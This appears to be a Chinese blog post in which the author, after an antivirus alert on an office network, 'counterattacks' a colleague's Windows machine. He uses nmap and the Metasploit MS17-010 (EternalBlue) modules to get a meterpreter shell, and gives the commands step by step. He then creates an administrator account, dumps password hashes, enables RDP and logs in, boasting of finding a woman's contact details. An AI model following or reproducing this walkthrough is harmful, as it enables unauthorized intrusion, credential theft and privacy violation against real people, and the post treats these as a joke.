源于一次内网攻击的反击：
已获取小姐姐的联系方式

     本来今天早上高高兴兴来上班，谁知道刚打开电脑连上公司无线我的火绒就提醒受到攻击了。额......

如下图所示

阿西吧，这种事情不能忍。马上扫一下这个ip准备反击

nmap -T4 -A -v 192.168.10.202

      从结果来看开的端口还不少，不过最引人注意的还是445端口。聪明的我立马就想到了ms17-010漏洞(永恒之蓝)。要反击的话最简单粗暴的办法就是利用这个漏洞，那么在反击之前先了解一下ms17-010漏洞到底是怎么回事吧。

漏洞描述：

      MS17-010是微软在2017年发现的第十个漏洞，俗称”永恒之蓝”,主要针对win7系统。Eternalblue通过TCP端口445和139来利用SMB v1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户有任何操作，只要开机上网，攻击者就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

影响版本：

      目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。

      对ms17-010漏洞有了大致了解之后，我就要开始进行反击了。首先掏出19年珍藏的kali，打开metasploit

msfconsole

然后就是搜索ms17-010漏洞相关的模块

search 17_010

      可以看到一共返回了5个可以利用的模块，这里重点关注的是箭头标识的两个。第一个是扫描模块，第二个是漏洞利用模块。

下面先扫描一下目标ip是否存在该漏洞

use auxiliary/scanner/smb/smb_ms17_010   # 使用扫描模块show options       #显示相关配置信息

了解了必须的一些配置信息之后就是针对目标ip进行选项配置并运行模块了

set RHOST 192.168.10.202  #设置目标主机set thread 444            #设置线程run                       #执行

可以看到扫描结果显示

Host is likely VULNERABLE to MS17-010!

      这下基本可以确认目标主机是存在ms17-010漏洞的。那么接下来就是如何利用该漏洞了。首先选择好漏洞利用模块

use exploit/windows/smb/ms17_010_psexecshow options

然后就是设置好必须的参数运行模块

set RHOST 192.168.10.202  #设置目标主机set thread 444            #设置线程run

      执行成功后会返回meterpreter，从结果来看已经成功获得了目标系统的权限。

在meterpreter下可以通过执行不同的命令来实现不同的目的

1、shell(获取目标的cmd界面)

查看当前有哪些账户

net user

创建一个新用户并加入到管理员组

net user swzaq swzaq /addnet localgroup administrators swzaq /add

      可以看到这里已经成功创建了，但是会有显示乱码的情况，执行chcp 65001命令即可解决

2、sysinfo(获取目标主机信息)

3、获取账户的hash值

run post/windows/gather/smart_hashdump

4、开启3389

post/windows/manage/enable_rdp

      到此，在目标主机上已经成功开启3389并且创建了管理员权限的账户。接下来就是登陆看看了。

直接按快捷键WIN键+R快速调出运行小窗口，输入远程桌面连接命令mstsc

然后填入目标主机的ip地址和刚才新建的账户名

在弹出的对话框中输入密码

然后点击确认即可进行连接

这里连接成功之后发现居然是个小姐姐的电脑

顺便还找到了小姐姐的联系方式

嗯，可真是一次愉快且有故事的反击。
